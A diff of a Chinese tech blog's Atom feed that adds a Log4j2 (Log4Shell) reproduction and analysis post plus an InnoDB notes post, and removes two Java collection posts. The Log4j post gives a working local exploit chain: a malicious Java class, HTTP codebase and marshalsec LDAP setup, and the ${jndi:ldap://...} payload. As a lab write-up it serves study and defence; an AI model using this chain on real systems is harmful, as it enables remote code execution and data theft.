@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://yao177.github.io</id>
     <title>York Zhang&apos;s Blog</title>
-    <updated>2022-03-01T06:05:14.915Z</updated>
+    <updated>2022-03-01T11:47:44.217Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://yao177.github.io"/>
     <link rel="self" href="https://yao177.github.io/atom.xml"/>
@@ -10,6 +10,75 @@
     <logo>https://yao177.github.io/images/avatar.png</logo>
     <icon>https://yao177.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, York Zhang&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[安全｜Log4j2 复现与原理]]></title>
+        <id>https://yao177.github.io/post/log4j2/</id>
+        <link href="https://yao177.github.io/post/log4j2/">
+        </link>
+        <updated>2021-12-11T09:13:04.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="漏洞复现">漏洞复现</h1>
+<h2 id="利用条件">利用条件：</h2>
+<p>靶机需要能访问外网，若 jdk8 需要小于 u124</p>
+<h2 id="web服务器">Web服务器</h2>
+<p>任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。</p>
+<h2 id="codebase服务器">CodeBase服务器</h2>
+<p>直接用 python 自带的 SimpleHttpServer 即可。将恶意 class 放入目录下。</p>
+<pre><code class="language-Java">public class Exploit {
+    static {
+//        try {
+//            Runtime.getRuntime().exec(&quot;reboot&quot;); 可以是任意代码，例如关机指令、进程关闭、将服务器文件外传、将内网拓扑结构外传、嵌入挖矿软件，any
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        } 
+        System.out.println(&quot;Exploit!&quot;);
+    }
+}
+</code></pre>
+<p>启动服务器：python3 -m SimpleHTTPServer 1234</p>
+<p>于是得到 codebase 地址：http://127.0.0.1:1234/</p>
+<h2 id="ldap服务器">LDAP服务器</h2>
+<p>随便找个LDAP简易服务器框架，例如https://github.com/mbechler/marshalsec</p>
+<p>该框架运行参数为<code>&lt;codebase_url#classname&gt; [&lt;port&gt;]</code></p>
+<p>我们测试时设置为：http://127.0.0.1:1234/#Exploit 2345</p>
+<h2 id="复现">复现</h2>
+<p>已知 controller 会打印参数信息，于是我们搜索：<br>
+<img src="https://yao177.github.io/post-images/1646129092453.png" alt="" loading="lazy"></p>
+<p>payload：<code>${jndi:ldap://127.0.0.1:2345/Exploit}</code><br>
+得到：<br>
+<img src="https://yao177.github.io/post-images/1646129683700.png" alt="" loading="lazy"></p>
+<p>相关利用姿势：上传堆栈、上传业务类字节码，而后可以将所有源码看尽。</p>
+<h2 id="完整攻击链">完整攻击链</h2>
+<p>总结完整攻击链：<br>
+<img src="https://yao177.github.io/post-images/1646129822790.svg" alt="" loading="lazy"></p>
+<p>该漏洞及其危险，黑客只需额外两台服务器，并在任何可能被日志打印的接口参数中嵌入恶意信息即可。若靶机 jdk 版本大于等于 u124，那将无法复现解析 reference 以访问 codebase 服务器。</p>
+<h1 id="漏洞原理">漏洞原理</h1>
+<h2 id="log4j">log4j</h2>
+<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646130822954.png" alt="" loading="lazy"></figure>
+<p>绕过冒号前缀校验</p>
+<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646130861459.png" alt="" loading="lazy"></figure>
+<p>将特殊指令解析为 jndi 指令=<br>
+访问 LDAP 服务器，接收构造好的指向外部的 Reference（有两种传输方式，一种Reference，一种本地序列化）</p>
+<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646130936561.png" alt="" loading="lazy"></figure>
+<p>web 服务器接收后，反序列化 reference，并从 codebase 的URL对象中获取字节流：</p>
+<p><img src="https://yao177.github.io/post-images/1646130973181.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646130999277.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646131017114.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646131035747.png" alt="" loading="lazy"></p>
+<p>利用我们定义的 javaFactory 进行类加载，还记得我们的设定么：</p>
+<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646131063716.png" alt="" loading="lazy"></figure>
+<p>这个ref便是我们的HTTP服务器：http://127.0.0.1:1234/，至此完成攻击。</p>
+<h1 id="example">Example</h1>
+<p>*ppo login、5*8 online</p>
+<pre><code class="language-Java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
+ com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
+(['Sat Dec 11 21:06:39 2021'], ':', 'ender.append(AbstractOutputStreamAppender.java:108), org.apache.logging.log4j.core.appender.RollingFileAppender.append(RollingFileAppender.java:88), org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99), org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367), org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112), org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:738), org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:708), org.apache.logging.slf4j.Log4jLogger.info(Log4jLogger.java:193), com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
+('receive from 2:', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
+(['Sat Dec 11 21:06:39 2021'], ':', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), 
+com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), 
+org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Java 框架｜Spring 启动加速器]]></title>
         <id>https://yao177.github.io/post/concurrent-spring-startup/</id>
@@ -350,6 +419,44 @@ public Manger {
 <h1 id="总结">总结</h1>
 <p>至此，项目已介绍完成，想随便聊聊。<br>
 本质上，这个项目就是利用了懒加载特性，先有个壳，再加载真正的 Bean 实体；其实这个思想在算法中也很常见，例如二分思想的经典算法——线段树，利用 lazy propagation (惰性传播) 在父节点打上修改的标记而不直接修改，只有真正访问到时才往子节点进行传递，提升了效率。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[数据库｜InnoDB 学习]]></title>
+        <id>https://yao177.github.io/post/innodb-study/</id>
+        <link href="https://yao177.github.io/post/innodb-study/">
+        </link>
+        <updated>2021-02-01T06:07:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="b-树">B+ 树</h1>
+<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646119612971.png" alt="B+树示意" loading="lazy"></figure>
+<ul>
+<li>叶子节点真正存储数据</li>
+<li>相邻叶子节点通过双向链表连接</li>
+<li>每个叶子节点存储了1页（page）数据，页通常是 16K，文件系统页通常为 4K，硬盘页通常为 512字节<br>
+<img src="https://yao177.github.io/post-images/1646122945576.png" alt="" loading="lazy"><br>
+假设每个数据行大小为rK，主键为bigint（8字节），页指针为6字节，则一个非叶子节点能存储16k/14 = 1170 个字节点信息。（为什么指针大小为6字节）<br>
+<img src="https://yao177.github.io/post-images/1646123070143.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646123090655.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646123151296.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646123173338.png" alt="" loading="lazy"></li>
+</ul>
+<h3 id="虚拟最大最小记录infimum-and-supremum-records">虚拟最大最小记录(Infimum and Supremum Records)</h3>
+<p>最大记录是这个数据页中逻辑上最大的记录，所有用户的记录都小于它。最小记录是数据页上最小的记录，所有用户记录都大于它。他们在数据页被创建的时候创建，而且不能被删除。引入他们主要是方便页内操作。</p>
+<h2 id="user-records">User Records</h2>
+<p>在页的7个组成部分中，存储的记录会按照指定的行格式存储到User Records部分。但是在一开始生成页的时候，其实并没有User Records这个部分，每当插入一条记录，都会从Free Space部分，也就是尚未使用的存储空间中申请一个记录大小的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使用完了，如果还有新的记录插入的话，就需要去申请新的页了。</p>
+<h2 id="free-space">Free Space</h2>
+<p>从PAGE_HEAP_TOP开始，到最后一个数据目录，这之间的空间就是空闲空间，都被重置为0，当用户需要插入记录时候，首先在被删除的记录的空间中查找，如果没有找到合适的空间，就从这里分配。空间分配给记录后，需要递增PAGE_N_RECS和PAGE_HEAP_TOP。</p>
+<h2 id="page-directory">Page Directory</h2>
+<p>用户的记录是从低地址向高地址扩展，而数据目录则相反。在数据页被初始化的时候，就会在数据页最后(当然在checksum之前)创建两个数据目录，分别指向最大和最小记录。之后插入新的数据的时候，需要维护这个目录，例如必要的时候增加目录的个数。每个数据目录占用两个字节，存储对应记录的页内相对位置，每个目录称为一个槽Slots。假设目录N，这个目录N管理目录N-1(不包括)和目录N之间的记录，我们称目录N own 这些记录。在目录N指向的记录中，字段n-owned会记录own记录的数量。由此可见，目录own的记录不能太多，因为太多的话，即意味着目录太过稀疏，不能很好的提高查询效率，但同时也不能own太少，这会导致目录数量变多，占用过多的空间。在InnoDB的实现中，伪记录Infimum的n_owned值总是1，记录supremum的n_owned的取值范围为[1，8]，其他用户记录n_owned的取值范围是[4，8]，平均是6个记录，如果超过这个数量，就需要重新均衡目录的数量。目录的增加和删除可能需要进行内存拷贝，但是由于目录占用的总体空间很小，开销可以忽略不计。</p>
+<p>由于在InnoDB中Page Directory是稀疏目录，二叉查找的结果只是一个粗略的结果，因此InnoDB必须通过recorder header中的next_record来继续查找相关记录。同时，Page Directory很好地解释了recorder header中n_owned值地含义，因为这些记录并包括在Page Directory中。B+树索引本身并不能找到具体的一条记录，能找到的只是该记录所在的页。数据库把页载入到内存，然后通过Page Directory再进行二分查找。二分查找的时间复杂度很低，同时再内存中的查找很快，因此通常忽略这部分查找所用的时间。</p>
+<h2 id="file-trailer">File Trailer</h2>
+<p>为了检测页是否已经完整的写入磁盘（如可能发生的写入过程中磁盘损坏、机器关机等），InnoDB存储引擎的页中设置了File Trailer部分。</p>
+<p>这个部分处于数据页最后的位置，只有8个字节。低地址的四个字节存储checksum的值，高地址的四个字节和File Header中的FIL_PAGE_LSN的低位四字节相同。注意这里的checksum的值不一定与FIL_PAGE_SPACE_OR_CHKSUM的相同，这个依赖不同的checksum计算方法。</p>
+<p>默认配置下，InnoDB每次从磁盘读取一个页就会检测该页的完整性，即页是否发生Corrupt，这就是通过File Traile部分来进行检测，而该部分的检测会有一定的开销。我们可以通过参数innodb_checksums来开启或关闭对这个页完整性的检查。</p>
+<blockquote>
+<p>参考资料<br>
+《极客时间：B+树：MySQL数据库索引是如何实现的？》</p>
+</blockquote>
 ]]></content>
     </entry>
     <entry>
@@ -1271,129 +1378,6 @@ public class HashSetDemo {
 <p>重新计算了下，扩容之后 2 和 18 就没有 hash 碰撞了</p>
 <h1 id="结论">结论</h1>
 <p>其实 HashSet 就是无序的，插入 1-n 后有序输出其实就是因为 Integer 的 hashCode 就是自身，取模后自然按照自然序在数组中排列，也就出现了开头「有序输出」的现象</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Java 集合｜HashMap 扩容时的 rehash 过程]]></title>
-        <id>https://yao177.github.io/post/hashmap-kuo-rong-shi-de-rehash-guo-cheng/</id>
-        <link href="https://yao177.github.io/post/hashmap-kuo-rong-shi-de-rehash-guo-cheng/">
-        </link>
-        <updated>2020-09-15T05:36:23.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="分化链表">分化链表</h1>
-<p><code>(e.hash &amp; oldCap) == 0</code>的元素放在低位链表，<code>(e.hash &amp; oldCap) != 0</code>的元素放在高位链表；低位链表在新桶的位置和旧桶中一样，高位链表在新桶的位置是原来的位置+旧容量</p>
-<pre><code class="language-java">Node&lt;K,V&gt; loHead = null, loTail = null;
-Node&lt;K,V&gt; hiHead = null, hiTail = null;
-Node&lt;K,V&gt; next;
-do {
-    next = e.next;
-    if ((e.hash &amp; oldCap) == 0) {
-        if (loTail == null)
-            loHead = e;
-        else
-            loTail.next = e;
-        loTail = e;
-    }
-    else {
-        if (hiTail == null)
-            hiHead = e;
-        else
-            hiTail.next = e;
-        hiTail = e;
-    }
-} while ((e = next) != null);
-if (loTail != null) {
-    loTail.next = null;
-    newTab[j] = loHead;
-}
-if (hiTail != null) {
-    hiTail.next = null;
-    newTab[j + oldCap] = hiHead;
-}
-</code></pre>
-<h3 id="原理">原理</h3>
-<p>首先，一个基础知识，对 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span> 取模可以优化为对 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 进行与运算，比较好理解，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 也就是 n-1 个 1 的二进制数，与运算之后就得到了原数二进制的后 n-1 位结果，也就是取模</p>
-<p>其次，分链时不需要像 JDK 1.7 那样重新计算 hash，只需要看新增的 bit 是 0 还是 1 就好了，0 的话索引不变，1 的话变为原索引 + 原容量，下面是一些计算</p>
-<pre><code class="language-java">oldCap = 1 &lt;&lt; k
-oldCap - 1 = 0b11...1 // k-1 个 1
-oldIndex = e.hash % oldCap
-				 = e.hash &amp; (oldCap - 1)
-newCap = oldCap &lt;&lt; 1
-newIndex = e.hash % newCap 
-				 = e.hash &amp; (newCap - 1) 
-				 = e.hash &amp; ((oldCap &lt;&lt; 1) - 1) 
-				 = e.hash &amp; (oldCap - 1) + e.hash &amp; oldCap
-</code></pre>
-<h1 id="拆树">拆树</h1>
-<p>拆树时本质上和分链是一样的，<code>HashMap.TreeNode</code>继承于<code>LinkedHashMap.Entry</code>继承于<code>HashMap.Node</code>，也就是说是有<code>next</code>引用的，而不是普通二叉树的前序/中序/后序遍历</p>
-<p>同样，拆树后也会和分链一样变成两个链表，然后再进行判断是否需要将新链表树化</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Java 集合｜试验 new ArrayList(0) 初始化]]></title>
-        <id>https://yao177.github.io/post/shi-yan-new-arraylist0-chu-shi-hua/</id>
-        <link href="https://yao177.github.io/post/shi-yan-new-arraylist0-chu-shi-hua/">
-        </link>
-        <updated>2020-09-15T05:27:28.000Z</updated>
-        <content type="html"><![CDATA[<p>只知道 new ArrayList(0) 的不同点在于 new ArrayList() 在添加第一个元素时会初始化为 10 个空间，但只知晓前者的概念，而我又想探究一下到底如何扩容</p>
-<p>正好最近刚学习了反射，就用反射来看一下 <code>elementData</code> 的实际大小</p>
-<pre><code class="language-java">import java.lang.reflect.Field;
-import java.util.ArrayList;
-
-public class Main {
-
-    public static void main( String[] args )
-    {
-        int pre;
-        final int max = 30;
-
-        ArrayList&lt;Integer&gt; arrayList1 = new ArrayList&lt;&gt;();
-        pre = -1;
-        for (int i = 0; i &lt; max; ++i) {
-            int now = getArrayListCapacity(arrayList1);
-            if (now != pre) {
-                pre = now;
-                System.out.print(pre + &quot; &quot;);
-            }
-            arrayList1.add(0);
-        }
-        System.out.println();
-
-        ArrayList&lt;Integer&gt; arrayList2 = new ArrayList&lt;&gt;(0);
-        pre = -1;
-        for (int i = 0; i &lt; max; ++i) {
-            int now = getArrayListCapacity(arrayList2);
-            if (now != pre) {
-                pre = now;
-                System.out.print(pre + &quot; &quot;);
-            }
-            arrayList2.add(0);
-        }
-    }
-
-    public static int getArrayListCapacity(ArrayList&lt;?&gt; arrayList) {
-        Class&lt;ArrayList&gt; arrayListClass = ArrayList.class;
-        try {
-            Field field = arrayListClass.getDeclaredField(&quot;elementData&quot;);
-            field.setAccessible(true);
-            Object[] objects = (Object[])field.get(arrayList);
-            return objects.length;
-        } catch (NoSuchFieldException e) {
-            e.printStackTrace();
-            return -1;
-        } catch (IllegalAccessException e) {
-            e.printStackTrace();
-            return -1;
-        }
-    }
-}
-
----
-Results:
-0 10 15 22 33
-0 1 2 3 4 6 9 13 19 28 42
-</code></pre>
-<p>都说是 1.5 倍扩容，甚至展示出了源码 <code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>，但是按理说 0 应该也会扩容为 0 呀（0 的 1.5 倍不是 0 吗，1 的 1.5 倍不是 1 吗，都不对）</p>
-<p>不过，这些教程都忽略了一个重要的点，传入的不是 <code>size</code> 而是 <code>size + 1</code>，从而解决了这个问题，再拿 <code>size + 1</code> vs <code>newCapacity</code>。</p>
 ]]></content>
     </entry>
 </feed>
